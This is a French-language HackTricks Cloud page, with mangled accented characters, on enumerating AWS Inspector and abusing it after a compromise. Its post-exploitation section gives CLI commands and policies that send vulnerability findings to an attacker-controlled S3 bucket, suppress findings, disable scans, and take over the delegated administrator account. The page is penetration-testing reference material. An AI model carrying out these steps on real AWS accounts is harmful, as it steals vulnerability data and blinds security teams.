# AWS - Inspector Enum

## AWS - Inspector Enum

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

### Inspector

Amazon Inspector est un service avanc√© et automatis√© de gestion des vuln√©rabilit√©s con√ßu pour am√©liorer la s√©curit√© de votre environnement AWS. Ce service scanne en continu les instances Amazon EC2, les images de conteneurs dans Amazon ECR, Amazon ECS et les fonctions AWS Lambda √† la recherche de vuln√©rabilit√©s et d'expositions r√©seau non intentionnelles. En s'appuyant sur une base de donn√©es d'intelligence sur les vuln√©rabilit√©s robuste, Amazon Inspector fournit des r√©sultats d√©taill√©s, y compris des niveaux de gravit√© et des recommandations de rem√©diation, aidant les organisations √† identifier et √† traiter proactivement les risques de s√©curit√©. Cette approche compl√®te garantit une posture de s√©curit√© renforc√©e √† travers divers services AWS, aidant √† la conformit√© et √† la gestion des risques.

### Key elements

#### Findings

Les findings dans Amazon Inspector sont des rapports d√©taill√©s sur les vuln√©rabilit√©s et les expositions d√©couvertes lors du scan des instances EC2, des d√©p√¥ts ECR ou des fonctions Lambda. En fonction de son √©tat, les findings sont class√©s comme suit :

* **Actif** : Le finding n'a pas √©t√© rem√©di√©.
* **Ferm√©** : Le finding a √©t√© rem√©di√©.
* **Supprim√©** : Le finding a √©t√© marqu√© avec cet √©tat en raison d'une ou plusieurs **r√®gles de suppression**.

Les findings sont √©galement class√©s en trois types :

* **Package** : Ces findings concernent les vuln√©rabilit√©s dans les packages logiciels install√©s sur vos ressources. Des exemples incluent des biblioth√®ques obsol√®tes ou des d√©pendances avec des probl√®mes de s√©curit√© connus.
* **Code** : Cette cat√©gorie inclut les vuln√©rabilit√©s trouv√©es dans le code des applications fonctionnant sur vos ressources AWS. Les probl√®mes courants sont des erreurs de codage ou des pratiques non s√©curis√©es qui pourraient entra√Æner des violations de s√©curit√©.
* **R√©seau** : Les findings r√©seau identifient les expositions potentielles dans les configurations r√©seau qui pourraient √™tre exploit√©es par des attaquants. Cela inclut des ports ouverts, des protocoles r√©seau non s√©curis√©s et des groupes de s√©curit√© mal configur√©s.

#### Filters and Suppression Rules

Les filtres et les r√®gles de suppression dans Amazon Inspector aident √† g√©rer et √† prioriser les findings. Les filtres vous permettent de raffiner les findings en fonction de crit√®res sp√©cifiques, tels que la gravit√© ou le type de ressource. Les r√®gles de suppression vous permettent de supprimer certains findings consid√©r√©s comme √† faible risque, d√©j√† att√©nu√©s, ou pour toute autre raison importante, emp√™chant ainsi leur surcharge dans vos rapports de s√©curit√© et vous permettant de vous concentrer sur des probl√®mes plus critiques.

#### Software Bill of Materials (SBOM)

Un Software Bill of Materials (SBOM) dans Amazon Inspector est une liste d'inventaire imbriqu√©e exportable d√©taillant tous les composants d'un package logiciel, y compris les biblioth√®ques et les d√©pendances. Les SBOM aident √† fournir de la transparence dans la cha√Æne d'approvisionnement logicielle, permettant une meilleure gestion des vuln√©rabilit√©s et conformit√©. Ils sont cruciaux pour identifier et att√©nuer les risques associ√©s aux composants logiciels open source et tiers.

### Key features

#### Export findings

Amazon Inspector offre la possibilit√© d'exporter les findings vers des Amazon S3 Buckets, Amazon EventBridge et AWS Security Hub, ce qui vous permet de g√©n√©rer des rapports d√©taill√©s des vuln√©rabilit√©s et expositions identifi√©es pour une analyse ou un partage ult√©rieur √† une date et heure sp√©cifiques. Cette fonctionnalit√© prend en charge divers formats de sortie tels que CSV et JSON, facilitant l'int√©gration avec d'autres outils et syst√®mes. La fonctionnalit√© d'exportation permet de personnaliser les donn√©es incluses dans les rapports, vous permettant de filtrer les findings en fonction de crit√®res sp√©cifiques tels que la gravit√©, le type de ressource ou la plage de dates, et incluant par d√©faut tous vos findings dans la r√©gion AWS actuelle avec un statut Actif.

Lors de l'exportation des findings, une cl√© de service de gestion des cl√©s (KMS) est n√©cessaire pour chiffrer les donn√©es lors de l'exportation. Les cl√©s KMS garantissent que les findings export√©s sont prot√©g√©s contre tout acc√®s non autoris√©, fournissant une couche de s√©curit√© suppl√©mentaire pour les informations sensibles sur les vuln√©rabilit√©s.

#### Amazon EC2 instances scanning

Amazon Inspector offre des capacit√©s de scan robustes pour les instances Amazon EC2 afin de d√©tecter les vuln√©rabilit√©s et les probl√®mes de s√©curit√©. Inspector compare les m√©tadonn√©es extraites de l'instance EC2 avec des r√®gles provenant d'avis de s√©curit√© afin de produire des vuln√©rabilit√©s de package et des probl√®mes de connectivit√© r√©seau. Ces scans peuvent √™tre effectu√©s par des m√©thodes **bas√©es sur un agent** ou **sans agent**, selon la configuration des param√®tres de **mode de scan** de votre compte.

* **Bas√© sur un agent** : Utilise l'agent AWS Systems Manager (SSM) pour effectuer des scans approfondis. Cette m√©thode permet une collecte et une analyse de donn√©es compl√®tes directement depuis l'instance.
* **Sans agent** : Fournit une alternative l√©g√®re qui ne n√©cessite pas l'installation d'un agent sur l'instance, cr√©ant un instantan√© EBS de chaque volume de l'instance EC2, recherchant des vuln√©rabilit√©s, puis le supprimant ; tirant parti de l'infrastructure AWS existante pour le scan.

Le mode de scan d√©termine quelle m√©thode sera utilis√©e pour effectuer les scans EC2 :

* **Bas√© sur un agent** : Implique l'installation de l'agent SSM sur les instances EC2 pour une inspection approfondie.
* **Scan hybride** : Combine les m√©thodes bas√©es sur un agent et sans agent pour maximiser la couverture et minimiser l'impact sur les performances. Dans les instances EC2 o√π l'agent SSM est install√©, Inspector effectuera un scan bas√© sur un agent, et pour celles o√π il n'y a pas d'agent SSM, le scan effectu√© sera sans agent.

Une autre fonctionnalit√© importante est l'**inspection approfondie** pour les instances Linux EC2. Cette fonctionnalit√© offre une analyse approfondie du logiciel et de la configuration des instances Linux EC2, fournissant des √©valuations d√©taill√©es des vuln√©rabilit√©s, y compris les vuln√©rabilit√©s du syst√®me d'exploitation, les vuln√©rabilit√©s des applications et les mauvaises configurations, garantissant une √©valuation compl√®te de la s√©curit√©. Cela est r√©alis√© par l'inspection des **chemins personnalis√©s** et de tous ses sous-r√©pertoires. Par d√©faut, Amazon Inspector scannera les √©l√©ments suivants, mais chaque compte membre peut d√©finir jusqu'√† 5 chemins personnalis√©s suppl√©mentaires, et chaque administrateur d√©l√©gu√© jusqu'√† 10 :

* `/usr/lib`
* `/usr/lib64`
* `/usr/local/lib`
* `/usr/local/lib64`

#### Amazon ECR container images scanning

Amazon Inspector fournit des capacit√©s de scan robustes pour les images de conteneurs Amazon Elastic Container Registry (ECR), garantissant que les vuln√©rabilit√©s de package sont d√©tect√©es et g√©r√©es efficacement.

* **Scan de base** : Il s'agit d'un scan rapide et l√©ger qui identifie les vuln√©rabilit√©s connues des packages OS dans les images de conteneurs en utilisant un ensemble standard de r√®gles du projet open-source Clair. Avec cette configuration de scan, vos d√©p√¥ts seront scann√©s lors de la pouss√©e ou en effectuant des scans manuels.
* **Scan am√©lior√©** : Cette option ajoute la fonctionnalit√© de scan continu en plus du scan lors de la pouss√©e. Le scan am√©lior√© plonge plus profond√©ment dans les couches de chaque image de conteneur pour identifier les vuln√©rabilit√©s dans les packages OS et dans les packages de langages de programmation avec une pr√©cision accrue. Il analyse √† la fois l'image de base et toutes les couches suppl√©mentaires, fournissant une vue compl√®te des probl√®mes de s√©curit√© potentiels.

#### Amazon Lambda functions scanning

Amazon Inspector inclut des capacit√©s de scan compl√®tes pour les fonctions AWS Lambda et ses couches, garantissant la s√©curit√© et l'int√©grit√© des applications sans serveur. Inspector propose deux types de scan pour les fonctions Lambda :

* **Scan standard Lambda** : Cette fonctionnalit√© par d√©faut identifie les vuln√©rabilit√©s logicielles dans les d√©pendances du package d'application ajout√©es √† votre fonction Lambda et √† ses couches. Par exemple, si votre fonction utilise une version d'une biblioth√®que comme python-jwt avec une vuln√©rabilit√© connue, elle g√©n√®re un finding.
* **Scan de code Lambda** : Analyse le code d'application personnalis√© √† la recherche de probl√®mes de s√©curit√©, d√©tectant des vuln√©rabilit√©s telles que des failles d'injection, des fuites de donn√©es, une cryptographie faible et un manque de chiffrement. Il capture des extraits de code mettant en √©vidence les vuln√©rabilit√©s d√©tect√©es, telles que des identifiants cod√©s en dur. Les findings incluent des suggestions de rem√©diation d√©taill√©es et des extraits de code pour corriger les probl√®mes.

#### **Center for Internet Security (CIS) scans**

Amazon Inspector inclut des scans CIS pour √©valuer les syst√®mes d'exploitation des instances Amazon EC2 par rapport aux recommandations des meilleures pratiques du Center for Internet Security (CIS). Ces scans garantissent que les configurations respectent les normes de s√©curit√© de l'industrie.

* **Configuration** : Les scans CIS √©valuent si les configurations syst√®me r√©pondent √† des recommandations sp√©cifiques du CIS Benchmark, chaque v√©rification √©tant li√©e √† un ID de v√©rification et un titre CIS.
* **Ex√©cution** : Les scans sont effectu√©s ou programm√©s en fonction des balises d'instance et des horaires d√©finis.
* **R√©sultats** : Les r√©sultats post-scan indiquent quelles v√©rifications ont r√©ussi, √©t√© ignor√©es ou √©chou√©es, fournissant un aper√ßu de la posture de s√©curit√© de chaque instance.

### Enumeration
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
### Post Exploitation

{% hint style="success" %}
Du point de vue d'un attaquant, ce service peut aider l'attaquant √† trouver des vuln√©rabilit√©s et des expositions r√©seau qui pourraient l'aider √† compromettre d'autres instances/conteneurs.

Cependant, un attaquant pourrait √©galement √™tre int√©ress√© √† perturber ce service afin que la victime ne puisse pas voir les vuln√©rabilit√©s (toutes ou sp√©cifiques).
{% endhint %}

#### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

Un attaquant pourrait g√©n√©rer des rapports d√©taill√©s sur les vuln√©rabilit√©s ou les factures de mat√©riaux logiciels (SBOM) et les exfiltrer de votre environnement AWS. Ces informations pourraient √™tre exploit√©es pour identifier des faiblesses sp√©cifiques, des logiciels obsol√®tes ou des d√©pendances non s√©curis√©es, permettant des attaques cibl√©es.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
L'exemple suivant montre comment exfiltrer toutes les constatations actives d'Amazon Inspector vers un seau Amazon S3 contr√¥l√© par l'attaquant avec une cl√© Amazon KMS contr√¥l√©e par l'attaquant :

1. **Cr√©er un seau Amazon S3** et attacher une politique √† celui-ci afin qu'il soit accessible depuis la victime Amazon Inspector :
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Cr√©er une cl√© Amazon KMS** et attacher une politique √† celle-ci afin qu'elle soit utilisable par l'Amazon Inspector de la victime :
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. Ex√©cutez la commande pour **cr√©er le rapport de r√©sultats** en l'exfiltrant :
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
* **Impact potentiel** : G√©n√©ration et exfiltration de rapports d√©taill√©s sur les vuln√©rabilit√©s et les logiciels, obtenant des informations sur des vuln√©rabilit√©s sp√©cifiques et des faiblesses de s√©curit√©.

#### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

Un attaquant pourrait annuler la g√©n√©ration du rapport de constatations sp√©cifi√© ou du rapport SBOM, emp√™chant les √©quipes de s√©curit√© de recevoir des informations en temps utile sur les vuln√©rabilit√©s et les factures de mat√©riaux logiciels (SBOM), retardant la d√©tection et la rem√©diation des probl√®mes de s√©curit√©.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
* **Impact potentiel** : Perturbation de la surveillance de la s√©curit√© et pr√©vention de la d√©tection et de la rem√©diation en temps opportun des probl√®mes de s√©curit√©.

#### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

Un attaquant disposant de ces autorisations pourrait manipuler les r√®gles de filtrage qui d√©terminent quelles vuln√©rabilit√©s et probl√®mes de s√©curit√© sont signal√©s ou supprim√©s (si l'**action** est d√©finie sur SUPPRESS, une r√®gle de suppression serait cr√©√©e). Cela pourrait cacher des vuln√©rabilit√©s critiques aux administrateurs de la s√©curit√©, facilitant l'exploitation de ces faiblesses sans d√©tection. En modifiant ou en supprimant des filtres importants, un attaquant pourrait √©galement cr√©er du bruit en inondant le syst√®me de r√©sultats non pertinents, entravant ainsi la surveillance et la r√©ponse efficaces √† la s√©curit√©.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
* **Impact potentiel** : Dissimulation ou suppression de vuln√©rabilit√©s critiques, ou inondation du syst√®me avec des r√©sultats non pertinents.

#### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

Un attaquant pourrait perturber de mani√®re significative la structure de gestion de la s√©curit√©.

* En d√©sactivant le compte administrateur d√©l√©gu√©, l'attaquant pourrait emp√™cher l'√©quipe de s√©curit√© d'acc√©der et de g√©rer les param√®tres et rapports d'Amazon Inspector.
* L'activation d'un compte administrateur non autoris√© permettrait √† un attaquant de contr√¥ler les configurations de s√©curit√©, potentiellement en d√©sactivant les analyses ou en modifiant les param√®tres pour cacher des activit√©s malveillantes.

{% hint style="warning" %}
Il est n√©cessaire que le compte non autoris√© soit dans la m√™me Organisation que la victime pour devenir l'administrateur d√©l√©gu√©.

Pour que le compte non autoris√© devienne l'administrateur d√©l√©gu√©, il est √©galement n√©cessaire qu'apr√®s la d√©sactivation de l'administrateur d√©l√©gu√© l√©gitime, et avant que le compte non autoris√© soit activ√© en tant qu'administrateur d√©l√©gu√©, l'administrateur l√©gitime doit √™tre d√©senregistr√© en tant qu'administrateur d√©l√©gu√© de l'organisation. Cela peut √™tre fait avec la commande suivante (**`organizations:DeregisterDelegatedAdministrator`** permission requise) : **`aws organizations deregister-delegated-administrator --account-id <legit-account-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**
{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
* **Impact potentiel** : Perturbation de la gestion de la s√©curit√©.

#### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

Un attaquant pourrait manipuler l'association des comptes membres au sein d'une organisation Amazon Inspector. En associant des comptes non autoris√©s ou en d√©sassociant des comptes l√©gitimes, un attaquant pourrait contr√¥ler quels comptes sont inclus dans les analyses de s√©curit√© et les rapports. Cela pourrait entra√Æner l'exclusion de comptes critiques de la surveillance de la s√©curit√©, permettant √† l'attaquant d'exploiter des vuln√©rabilit√©s dans ces comptes sans d√©tection.

{% hint style="warning" %}
Cette action doit √™tre effectu√©e par l'administrateur d√©l√©gu√©.
{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
* **Impact potentiel** : Exclusion de comptes cl√©s des analyses de s√©curit√©, permettant l'exploitation non d√©tect√©e des vuln√©rabilit√©s.

#### `inspector2:Disable`, (`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

Un attaquant avec la permission `inspector2:Disable` serait capable de d√©sactiver les analyses de s√©curit√© sur des types de ressources sp√©cifiques (EC2, ECR, Lambda, code Lambda) pour les comptes sp√©cifi√©s, laissant des parties de l'environnement AWS non surveill√©es et vuln√©rables aux attaques. De plus, gr√¢ce aux permissions **`inspector2:Enable`** & **`iam:CreateServiceLinkedRole`**, un attaquant pourrait alors r√©activer les analyses de mani√®re s√©lective pour √©viter la d√©tection de configurations suspectes.

{% hint style="warning" %}
Cette action doit √™tre effectu√©e par l'administrateur d√©l√©gu√©.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
* **Impact potentiel** : Cr√©ation de zones d'ombre dans la surveillance de la s√©curit√©.

#### `inspector2:UpdateOrganizationConfiguration`

Un attaquant disposant de cette autorisation pourrait mettre √† jour les configurations de votre organisation Amazon Inspector, affectant les fonctionnalit√©s de scan par d√©faut activ√©es pour les nouveaux comptes membres.

{% hint style="warning" %}
Cette action doit √™tre effectu√©e par l'administrateur d√©l√©gu√©.
{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
* **Impact potentiel** : Modifier les politiques et configurations de scan de s√©curit√© pour l'organisation.

#### `inspector2:TagResource`, `inspector2:UntagResource`

Un attaquant pourrait manipuler les balises sur les ressources AWS Inspector, qui sont critiques pour organiser, suivre et automatiser les √©valuations de s√©curit√©. En modifiant ou en supprimant des balises, un attaquant pourrait potentiellement cacher des vuln√©rabilit√©s des scans de s√©curit√©, perturber les rapports de conformit√© et interf√©rer avec les processus de rem√©diation automatis√©s, entra√Ænant des probl√®mes de s√©curit√© non contr√¥l√©s et une int√©grit√© du syst√®me compromise.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
* **Impact potentiel** : Masquage des vuln√©rabilit√©s, perturbation des rapports de conformit√©, perturbation de l'automatisation de la s√©curit√© et perturbation de l'allocation des co√ªts.

## R√©f√©rences

* [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
* [https://docs.aws.amazon.com/service-authorization/latest/reference/list\_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list\_amazoninspector2.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
